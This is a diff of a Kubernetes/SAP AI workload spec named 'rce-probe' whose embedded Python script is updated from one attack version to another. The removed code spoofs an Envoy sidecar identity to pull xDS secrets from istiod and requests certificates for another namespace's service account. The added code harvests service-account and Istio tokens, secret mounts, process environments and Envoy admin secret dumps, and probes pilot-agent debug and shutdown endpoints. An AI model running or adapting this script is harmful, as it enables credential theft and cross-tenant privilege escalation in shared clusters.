@@ -4,10 +4,10 @@ metadata:
   name: rce-probe
   labels:
     scenarios.ai.sap.com/id: "rce-probe"
-    ai.sap.com/version: "4.8.0"
+    ai.sap.com/version: "4.9.0"
   annotations:
     scenarios.ai.sap.com/name: "rce-probe"
-    executables.ai.sap.com/description: "istiod-xds-post-fix-citadel-csr-signing"
+    executables.ai.sap.com/description: "jwt-token-hunt-secrets-sds-proc"
     executables.ai.sap.com/name: "rce-probe"
 spec:
   template:
@@ -28,175 +28,161 @@ spec:
           args:
           - |
             python3 -c "
-            import socket, struct, select as sel
+            import os, socket, struct, subprocess, glob
 
-            print('[PROBE_V48_START]', flush=True)
+            print('[PROBE_V49_START]', flush=True)
 
-            # ── H2 helpers ────────────────────────────────────────────────────────
-            def encode_varint(n):
-                out = b''
-                while True:
-                    bits = n & 0x7F; n >>= 7
-                    out += bytes([bits | (0x80 if n else 0)])
-                    if not n: break
-                return out
+            # ── Emit helper ───────────────────────────────────────────────────────
+            def emit(label, data):
+                flat = str(data).replace('\r\n','|').replace('\r','|').replace('\n','|')
+                print(f'[{label}] {flat}', flush=True)
 
-            def encode_string_field(n, s):
-                b = s.encode()
-                return bytes([n << 3 | 2]) + encode_varint(len(b)) + b
-
-            def encode_msg_field(n, msg):
-                return bytes([n << 3 | 2]) + encode_varint(len(msg)) + msg
-
-            def grpc_frame(msg):
-                return b'\x00' + struct.pack('>I', len(msg)) + msg
-
-            def h2_frame(ftype, flags, stream_id, payload):
-                l = len(payload)
-                return struct.pack('>I', l)[1:] + bytes([ftype, flags]) + struct.pack('>I', stream_id) + payload
-
-            def h2_settings_ack():
-                return h2_frame(0x04, 0x01, 0, b'')
-
-            def h2_win_update(stream, incr):
-                return h2_frame(0x08, 0x00, stream, struct.pack('>I', incr))
-
-            def read_h2_frames(sock, n=15, timeout=8):
-                frames = []
-                for _ in range(n):
-                    r, _, _ = sel.select([sock], [], [], timeout)
-                    if not r: break
-                    hdr = b''
-                    while len(hdr) < 9:
-                        c = sock.recv(9-len(hdr))
-                        if not c: return frames
-                        hdr += c
-                    length = struct.unpack('>I', b'\x00'+hdr[:3])[0]
-                    ftype = hdr[3]; flags = hdr[4]
-                    stream = struct.unpack('>I', hdr[5:9])[0] & 0x7FFFFFFF
-                    data = b''
-                    while len(data) < length:
-                        c = sock.recv(length-len(data))
-                        if not c: break
-                        data += c
-                    frames.append((ftype, flags, stream, data))
-                    if ftype == 0x04 and not (flags & 0x01):
-                        sock.sendall(h2_settings_ack())
-                    if ftype == 0x00:
-                        sock.sendall(h2_win_update(0, max(1, len(data))))
-                return frames
-
-            def hpack_lit(name, value, huffman=False):
-                # Literal without indexing (0x00 prefix)
-                n = name.encode(); v = value.encode()
-                return bytes([0x00]) + encode_varint(len(n)) + n + encode_varint(len(v)) + v
-
-            def grpc_connect(host, port, path, grpc_msg, stream_id=1, timeout=12):
+            # ── Envoy admin H2C bypass ────────────────────────────────────────────
+            def envoy_admin(path, timeout=20):
                 s = socket.socket(); s.settimeout(timeout)
-                s.connect((host, port))
-                CLIENT_PREFACE = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
-                s.sendall(CLIENT_PREFACE + h2_frame(0x04, 0x00, 0, b''))
-                frames = read_h2_frames(s, n=3, timeout=5)
-
-                # HEADERS: POST, content-type: application/grpc
-                hblock = (
-                    bytes([0x83]) +          # :method POST (static idx 3)
-                    hpack_lit(':path', path) +
-                    bytes([0x86]) +          # :scheme http (static idx 6)
-                    hpack_lit(':authority', f'{host}:{port}') +
-                    hpack_lit('content-type', 'application/grpc') +
-                    hpack_lit('te', 'trailers')
+                s.connect(('127.0.0.1', 15000))
+                req = (
+                    f'GET {path} HTTP/1.1\r\n'
+                    'Host: 127.0.0.1\r\n'
+                    'Connection: Upgrade, HTTP2-Settings\r\n'
+                    'Upgrade: h2c\r\n'
+                    'HTTP2-Settings: AAMAAABkAAQAAP__\r\n'
+                    'Connection: close\r\n\r\n'
                 )
-                s.sendall(h2_frame(0x01, 0x04, stream_id, hblock))
-                s.sendall(h2_frame(0x00, 0x01, stream_id, grpc_frame(grpc_msg)))
-
-                resp_frames = read_h2_frames(s, n=20, timeout=timeout)
+                s.sendall(req.encode())
+                chunks = []
+                while True:
+                    c = s.recv(65536)
+                    if not c: break
+                    chunks.append(c)
                 s.close()
-                return frames + resp_frames
+                return b''.join(chunks).decode(errors='replace')
 
-            # ── XDS ADS DiscoveryRequest ──────────────────────────────────────────
-            # Node identity that mimics a real Envoy proxy on this cluster
-            NODE_ID = 'sidecar~100.64.0.2~probe.rg-0d70dc91-cd927cab~rg-0d70dc91-cd927cab.svc.cluster.local'
-            CLUSTER = 'rg-0d70dc91-cd927cab'
-            node_pb = encode_string_field(1, NODE_ID) + encode_string_field(3, CLUSTER)
-
-            for type_url in [
-                'type.googleapis.com/envoy.config.cluster.v3.Cluster',
-                'type.googleapis.com/envoy.extensions.transport_sockets.tls.v3.Secret',
-            ]:
-                print(f'[XDS] type_url={type_url}', flush=True)
-                dr = encode_msg_field(2, node_pb) + encode_string_field(4, type_url)
+            # ── 1. Kubernetes SA token paths ──────────────────────────────────────
+            print('[TOKEN_HUNT_START]', flush=True)
+            token_paths = [
+                '/var/run/secrets/kubernetes.io/serviceaccount/token',
+                '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt',
+                '/var/run/secrets/kubernetes.io/serviceaccount/namespace',
+                '/var/run/secrets/tokens/istio-token',
+                '/var/run/secrets/tokens/kube-apiserver-token',
+                '/run/secrets/kubernetes.io/serviceaccount/token',
+                '/secrets/token',
+            ]
+            for p in token_paths:
                 try:
-                    frames = grpc_connect(
-                        'istiod.istio-system.svc.cluster.local', 15010,
-                        '/envoy.service.discovery.v3.AggregatedDiscoveryService/StreamAggregatedResources',
-                        dr, stream_id=1, timeout=12
-                    )
-                    for ftype, flags, stream, data in frames:
-                        info = f'type={ftype} flags={flags:02x} stream={stream} len={len(data)}'
-                        if ftype == 0x00 and data:  # DATA frame = gRPC response
-                            # Strip 5-byte gRPC framing
-                            grpc_data = data[5:] if len(data) > 5 else data
-                            print(f'  DATA {info} grpc_hex={grpc_data[:100].hex()}', flush=True)
-                            # Try to find any string resources
-                            printable = ''.join(chr(b) if 32 <= b < 127 else '.' for b in grpc_data)
-                            print(f'  DATA printable: {printable[:200]}', flush=True)
-                        elif ftype == 0x01:  # HEADERS frame
-                            printable = ''.join(chr(b) if 32 <= b < 127 else '.' for b in data)
-                            print(f'  HEADERS {info}: {printable[:200]}', flush=True)
-                        else:
-                            print(f'  frame {info}', flush=True)
+                    with open(p, 'rb') as f:
+                        data = f.read()
+                    emit(f'TOKEN_FILE_{p.replace(\"/\",\"_\")}', data[:2000].decode(errors='replace'))
                 except Exception as e:
-                    print(f'  ERR: {e}', flush=True)
+                    emit(f'TOKEN_MISS_{p.replace(\"/\",\"_\")}', str(e))
 
-            # ── Citadel CSR — our own SPIFFE identity ─────────────────────────────
-            OWN_CSR = '''-----BEGIN CERTIFICATE REQUEST-----
-            MIIBKTCB0QIBADAYMRYwFAYDVQQKDA1jbHVzdGVyLmxvY2FsMFkwEwYHKoZIzj0C
-            AQYIKoZIzj0DAQcDQgAEQ2+Sk3jcBmTI3G3vr88oCll/Dgv3LuTzsefuRAjdiXcI
-            WL9dy3BLZSwFCRwKN5GugqiV/705co8MLrF9Aui0R6BXMFUGCSqGSIb3DQEJDjFI
-            MEYwRAYDVR0RBD0wO4Y5c3BpZmZlOi8vY2x1c3Rlci5sb2NhbC9ucy9yZy0wZDcw
-            ZGM5MS1jZDkyN2NhYi9zYS9kZWZhdWx0MAoGCCqGSM49BAMCA0cAMEQCIGmkDRt5
-            KrwKI/eyqWgY7rjFfDwXXM+7py4K3UekLn7YAiAsbkD6rSZzWp/u1LZ5YwblNNT8
-            23WLjPVrRiu2CaK04g==
-            -----END CERTIFICATE REQUEST-----'''
-
-            # Citadel CSR for the USER-MANAGEMENT SA identity (cross-namespace attempt)
-            USRMGMT_CSR = '''-----BEGIN CERTIFICATE REQUEST-----
-            MIIBKDCB0AIBADAYMRYwFAYDVQQKDA1jbHVzdGVyLmxvY2FsMFkwEwYHKoZIzj0C
-            AQYIKoZIzj0DAQcDQgAEcdxDit3PIkFW0Qe4d5TF0QowfFrm8qfC+fwH9eqtpn+H
-            9NPKakokPIL0hzRIcTlAEi8p/a5bptdKvPh4vymbaqBWMFQGCSqGSIb3DQEJDjFH
-            MEUwQwYDVR0RBDwwOoY4c3BpZmZlOi8vY2x1c3Rlci5sb2NhbC9ucy91c2VyLW1h
-            bmFnZW1lbnQvc2EvYXBpLXNlcnZpY2UwCgYIKoZIzj0EAwIDRwAwRAIgMitkHjN6
-            Sph/GvJ/QYkS+AuCyBtDCmNN0ATYHNXCz3ICIFY4YY1hGFmXvpR5rIMMUn9VV8Rq
-            i6rDkzEVdB1AGiIJ
-            -----END CERTIFICATE REQUEST-----'''
-
-            for label, csr_pem in [('OWN', OWN_CSR), ('USER-MGMT', USRMGMT_CSR)]:
-                print(f'[CITADEL-CSR] {label}', flush=True)
-                csr_clean = '\n'.join(l.strip() for l in csr_pem.strip().splitlines())
-                # IstioCertificateRequest: field 1=csr, field 2=validity_duration(86400s)
-                csr_pb = encode_string_field(1, csr_clean)
-                csr_pb += bytes([0x10]) + encode_varint(86400)  # field 2, varint 86400
+            # ── 2. Glob all secret mounts ─────────────────────────────────────────
+            for pat in ['/var/run/secrets/**', '/run/secrets/**', '/secrets/**']:
                 try:
-                    frames = grpc_connect(
-                        'istiod.istio-system.svc.cluster.local', 15010,
-                        '/istio.v1.auth.IstioCertificateService/CreateCertificate',
-                        csr_pb, stream_id=3, timeout=12
-                    )
-                    for ftype, flags, stream, data in frames:
-                        info = f'type={ftype} flags={flags:02x} stream={stream} len={len(data)}'
-                        if ftype == 0x00 and data:
-                            grpc_data = data[5:] if len(data)>5 else data
-                            # If we got a cert, it starts with PEM header
-                            printable = ''.join(chr(b) if 32<=b<127 else '.' for b in grpc_data)
-                            print(f'  DATA {info}: {printable[:500]}', flush=True)
-                        elif ftype == 0x01:
-                            printable = ''.join(chr(b) if 32<=b<127 else '.' for b in data)
-                            print(f'  HDRS {info}: {printable[:300]}', flush=True)
+                    found = glob.glob(pat, recursive=True)
+                    emit(f'GLOB_{pat}', found)
                 except Exception as e:
-                    print(f'  ERR: {e}', flush=True)
+                    emit(f'GLOB_ERR', str(e))
 
-            print('[PROBE_V48_DONE]', flush=True)
+            # ── 3. /proc/1/environ ────────────────────────────────────────────────
+            try:
+                with open('/proc/1/environ', 'rb') as f:
+                    env = f.read().replace(b'\x00', b'|')
+                emit('PROC1_ENVIRON', env.decode(errors='replace'))
+            except Exception as e:
+                emit('PROC1_ENVIRON_ERR', str(e))
+
+            # ── 4. /proc/self/environ ─────────────────────────────────────────────
+            try:
+                with open('/proc/self/environ', 'rb') as f:
+                    env = f.read().replace(b'\x00', b'|')
+                emit('SELF_ENVIRON', env.decode(errors='replace'))
+            except Exception as e:
+                emit('SELF_ENVIRON_ERR', str(e))
+
+            # ── 5. /proc/mounts ───────────────────────────────────────────────────
+            try:
+                with open('/proc/mounts', 'r') as f:
+                    emit('PROC_MOUNTS', f.read())
+            except Exception as e:
+                emit('PROC_MOUNTS_ERR', str(e))
+
+            # ── 6. Envoy admin /secrets (SDS secret names) ───────────────────────
+            try:
+                sec = envoy_admin('/secrets')
+                # Just the first 8000 chars to avoid truncation
+                emit('ENVOY_SECRETS', sec[:8000])
+            except Exception as e:
+                emit('ENVOY_SECRETS_ERR', str(e))
+
+            # ── 7. pilot-agent port 15020 endpoints ──────────────────────────────
+            for ep in ['/', '/healthz/ready', '/debug/config_dump', '/debug/ndsz',
+                       '/quitquitquit', '/app-health/kserve-container/readyz']:
+                try:
+                    s = socket.socket(); s.settimeout(8)
+                    s.connect(('127.0.0.1', 15020))
+                    req = f'GET {ep} HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n'
+                    s.sendall(req.encode())
+                    resp = b''
+                    while True:
+                        c = s.recv(65536)
+                        if not c: break
+                        resp += c
+                    s.close()
+                    emit(f'PORT15020_{ep.replace(\"/\",\"_\")}', resp[:3000].decode(errors='replace'))
+                except Exception as e:
+                    emit(f'PORT15020_ERR_{ep.replace(\"/\",\"_\")}', str(e))
+
+            # ── 8. /proc/net/unix (accessible sockets) ───────────────────────────
+            try:
+                with open('/proc/net/unix', 'r') as f:
+                    emit('PROC_NET_UNIX', f.read())
+            except Exception as e:
+                emit('PROC_NET_UNIX_ERR', str(e))
+
+            # ── 9. XDS workload socket ────────────────────────────────────────────
+            xds_sockets = [
+                '/var/run/secrets/workload-spiffe-uds/socket',
+                '/var/run/secrets/grpc-xds/xds-grpc',
+                '/tmp/grpc-xds.sock',
+                '/var/run/grpc/grpc-xds.sock',
+            ]
+            for sp in xds_sockets:
+                exists = os.path.exists(sp)
+                emit(f'XDS_SOCK_{sp.replace(\"/\",\"_\")}', exists)
+
+            # ── 10. Try istiod:15010 with our SA token if found ──────────────────
+            token_val = None
+            try:
+                with open('/var/run/secrets/kubernetes.io/serviceaccount/token') as f:
+                    token_val = f.read().strip()
+                emit('SA_TOKEN_FOUND', f'len={len(token_val)} prefix={token_val[:50]}')
+            except:
+                emit('SA_TOKEN_NOT_MOUNTED', 'skipping istiod auth attempt')
+
+            # ── 11. /proc/1/fd symlinks (check for token file descriptors) ───────
+            try:
+                fds = os.listdir('/proc/1/fd')
+                fd_links = []
+                for fd in fds[:50]:
+                    try:
+                        link = os.readlink(f'/proc/1/fd/{fd}')
+                        fd_links.append(f'{fd}→{link}')
+                    except:
+                        pass
+                emit('PROC1_FDS', fd_links)
+            except Exception as e:
+                emit('PROC1_FDS_ERR', str(e))
+
+            # ── 12. Envoy /config_dump?resource=dynamic_active_secrets ────────────
+            try:
+                sec2 = envoy_admin('/config_dump?resource=dynamic_active_secrets')
+                emit('CFGDUMP_SECRETS', sec2[:8000])
+            except Exception as e:
+                emit('CFGDUMP_SECRETS_ERR', str(e))
+
+            print('[PROBE_V49_DONE]', flush=True)
             " 2>&1
             python3 -c "
             import http.server
